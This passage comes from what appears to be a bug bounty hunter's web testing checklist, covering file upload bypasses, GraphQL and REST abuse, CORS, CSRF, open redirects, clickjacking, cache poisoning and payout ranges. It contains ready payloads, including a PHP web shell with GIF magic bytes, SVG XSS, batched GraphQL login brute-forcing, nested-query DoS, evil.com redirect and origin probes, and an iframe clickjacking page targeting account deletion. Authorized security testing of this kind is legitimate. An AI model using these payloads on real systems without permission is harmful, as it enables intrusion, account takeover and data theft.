  shell.pHp              → Case bypass
  shell.php5             → Alternative extension
  shell.php.bak          → May be interpreted as PHP
  shell.php;.jpg         → Semicolon bypass (IIS)
  shell.php%0a.jpg       → Newline in filename
  shell.php.....         → Trailing dots (Windows)
  shell.php::$DATA       → ADS bypass (Windows)
  ```

- [ ] **Bypass content-type validation**
  ```
  Change Content-Type header:
  Content-Type: image/jpeg     → Even though uploading .php
  Content-Type: image/png
  Content-Type: image/gif
  
  Also add magic bytes at the start of the file:
  GIF89a<?php system($_GET['cmd']); ?>
  ```

- [ ] **Check where files are stored**
  ```
  - Can I access the uploaded file directly?
  - Is it on the same domain? (enables XSS)
  - Does the URL contain the filename? (path traversal)
  - Is the filename predictable or sequential?
  ```

- [ ] **SVG upload for XSS**
  ```xml
  <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
    <rect width="100" height="100"/>
  </svg>
  ```

---

# 🌐 PHASE 8: API-SPECIFIC TESTING

## 8.1 GraphQL

- [ ] **Introspection query (find the entire schema)**
  ```graphql
  # Send as POST with Content-Type: application/json
  {"query":"{__schema{types{name,fields{name,args{name}}}}}"}
  
  # If introspection is disabled, try:
  {"query":"{__type(name:\"User\"){name,fields{name}}}"}
  
  # Useful tool: GraphQL Voyager — visualizes the schema
  ```

- [ ] **Batch query abuse**
  ```json
  [
    {"query":"mutation{login(email:\"a@b.com\",pass:\"pass1\"){ token }}"},
    {"query":"mutation{login(email:\"a@b.com\",pass:\"pass2\"){ token }}"},
    {"query":"mutation{login(email:\"a@b.com\",pass:\"pass3\"){ token }}"}
  ]
  ```
  → Bypasses rate limiting! Each item in the batch processed as separate request.

- [ ] **Excessive data exposure** — Query all fields on a type
- [ ] **Nested query DoS** — Deep nesting can crash the server
  ```graphql
  {user{friends{friends{friends{friends{friends{name}}}}}}}
  ```

## 8.2 REST API

- [ ] **Mass assignment** — Send extra fields in POST/PUT requests
- [ ] **API versioning** — Try `/api/v1/` if `/api/v2/` is current (old versions may lack security fixes)
- [ ] **HTTP method override**
  ```
  X-HTTP-Method-Override: DELETE
  X-Method-Override: PUT
  ```
- [ ] **Content-type switching** — JSON → XML (may expose XXE)
- [ ] **Pagination abuse** — `?limit=99999999` (dump all records)

---

# 🛡️ PHASE 9: CLIENT-SIDE TESTING

## 9.1 CORS Misconfiguration

- [ ] **Test CORS**
  ```bash
  # Check if arbitrary origin is reflected
  curl -sk -H "Origin: https://evil.com" -I https://target.com/api/user
  # Look for: Access-Control-Allow-Origin: https://evil.com
  # AND: Access-Control-Allow-Credentials: true
  # If BOTH → you can steal data cross-origin
  
  # Try null origin
  curl -sk -H "Origin: null" -I https://target.com/api/user
  
  # Try subdomain
  curl -sk -H "Origin: https://evil.target.com" -I https://target.com/api/user
  
  # Try prefix/suffix
  curl -sk -H "Origin: https://target.com.evil.com" -I https://target.com/api/user
  curl -sk -H "Origin: https://eviltarget.com" -I https://target.com/api/user
  ```

## 9.2 CSRF

- [ ] **Check for CSRF on state-changing requests**
  ```
  For every POST/PUT/DELETE request that changes state:
  - Is there a CSRF token? 
  - Remove the token → does it still work?
  - Change the token to a random value → does it still work?
  - Use your token on another user's session → does it still work?
  - Change POST to GET → does it still work? (easier to exploit)
  ```

## 9.3 Open Redirect

- [ ] **Test all redirect parameters**
  ```
  ?redirect=https://evil.com
  ?url=https://evil.com
  ?next=https://evil.com
  ?return=https://evil.com
  ?dest=https://evil.com
  ?continue=https://evil.com
  ?returnUrl=//evil.com
  ?redirect=/\evil.com
  ?redirect=https://target.com@evil.com
  ?redirect=https://evil.com#target.com
  ?redirect=https://evil.com?.target.com
  ?redirect=//evil%E3%80%82com     (Unicode dot)
  ?redirect=https:evil.com         (missing //)
  ?redirect=\/\/evil.com
  ```

## 9.4 Clickjacking

- [ ] **Check for X-Frame-Options / CSP frame-ancestors**
  ```bash
  curl -sI https://target.com | grep -iE 'x-frame-options|content-security-policy'
  
  # If missing, try embedding in iframe:
  # Create a local HTML file:
  <iframe src="https://target.com/settings/delete-account" 
          style="opacity:0; position:absolute; top:0; left:0;
                 width:100%; height:100%;">
  </iframe>
  <button style="position:relative; z-index:1;">Click me for a prize!</button>
  ```

---

# 🔟 PHASE 10: MISC CHECKS

- [ ] **Security headers check**
  ```bash
  curl -sI https://target.com | grep -iE 'strict-transport|content-security|x-frame|x-content-type|x-xss|referrer-policy|permissions-policy|feature-policy'
  
  Missing headers to report (usually informational/low):
  - Strict-Transport-Security
  - Content-Security-Policy
  - X-Frame-Options
  - X-Content-Type-Options
  - Referrer-Policy
  ```

- [ ] **Information disclosure**
  ```
  Check for:
  - Verbose error messages with stack traces
  - Server version in headers (Server: Apache/2.4.49)
  - Debug mode enabled
  - Default credentials on admin panels
  - Source code in HTML comments
  - Internal IPs in responses
  - User emails/PII in API responses you shouldn't see
  ```

- [ ] **Subdomain takeover re-check**
  ```bash
  # Run again after a week — infrastructure changes constantly
  subjack -w all_subdomains.txt -t 50 -ssl -o takeover_recheck.txt
  ```

- [ ] **HTTP Request Smuggling** (advanced)
  ```
  # Use Burp extension: HTTP Request Smuggler
  # Test CL.TE and TE.CL desync attacks
  # This is advanced but pays VERY well
  ```

- [ ] **WebSocket testing** (if present)
  ```
  - Cross-Site WebSocket Hijacking (CSWSH)
  - Injection through WebSocket messages
  - Authorization bypass on WebSocket connections
  ```

- [ ] **Cache poisoning** (if using CDN)
  ```
  Add unkeyed headers:
  X-Forwarded-Host: evil.com
  X-Original-URL: /evil-page
  
  If the response caches with your poisoned content → cache poisoning
  ```

---

# 📊 SEVERITY CHEAT SHEET (How to Price Your Bugs)

| Severity | What It Looks Like | Typical Payout |
|----------|-------------------|----------------|
| **Critical** | RCE, Auth bypass to admin, SQLi with data dump, SSRF to cloud metadata, Full account takeover | $3,000 - $50,000+ |
| **High** | Stored XSS on main app, IDOR leaking PII of all users, Privilege escalation to admin, CSRF on critical actions | $1,000 - $10,000 |
| **Medium** | Self-XSS with social engineering, IDOR leaking non-sensitive data, Rate limiting bypass on login, Information disclosure (internal IPs, stack traces) | $200 - $2,000 |
| **Low** | Missing security headers, Clickjacking on non-sensitive page, Open redirect (no chain), Username enumeration | $50 - $500 |

> [!IMPORTANT]
> **The difference between a $500 and $5,000 payout is NOT the bug class — it's the IMPACT you demonstrate.** Always chain. Always show worst-case scenario. Always explain business impact.

---

# 🔁 DAILY HUNTING ROUTINE

```
┌─────────────────────────────────────────────┐
│  DAILY ROUTINE (3-4 hours per session)       │
├─────────────────────────────────────────────┤
│                                              │
│  1. Review yesterday's notes (10 min)        │
│  2. Check for new features/changes (10 min)  │
│  3. Pick ONE section from this checklist     │
│  4. Work through it systematically (2-3 hrs) │
│  5. Document findings, even if no bug (15m)  │
│  6. Update this checklist (check boxes)      │
│                                              │
│  WEEKLY:                                     │
│  - Re-run subdomain enumeration              │
│  - Review H1/Bugcrowd disclosed reports      │
│  - Read one new technique/blog post          │
│                                              │
└─────────────────────────────────────────────┘
```

---

> [!CAUTION]
> **This checklist is your weapon. But the weapon doesn't fight for you.**
> You need to UNDERSTAND why each test works, not just copy-paste commands. 
> When you test for SSRF, understand WHY `169.254.169.254` is dangerous. 
> When you test for SQLi, understand WHY `' OR 1=1--` works. 
> The checklist catches the bugs. The understanding catches the MONEY bugs.

**Now go hunt. Systematically. One section per day. Don't skip items.**
**Come back with findings, not questions.** 🔥
